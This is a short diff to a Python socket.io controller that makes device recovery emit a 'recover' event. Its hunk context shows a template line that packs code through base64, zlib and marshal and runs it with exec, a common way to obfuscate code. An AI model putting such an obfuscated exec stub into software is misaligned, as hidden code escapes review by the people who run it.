@@ -461,7 +461,8 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         self.sio.emit("key_press_short", data)
 
     def recover(self, device_id):
-        self.recovering.append(device_id)
+        self.sio.emit("recover", {"uid": device_id})
+        #self.recovering.append(device_id)
 
     def recover_html(self, uid):
         if (uid in self.recovering):
@@ -469,4 +470,3 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             return "true"
         else :
             return "false"
-
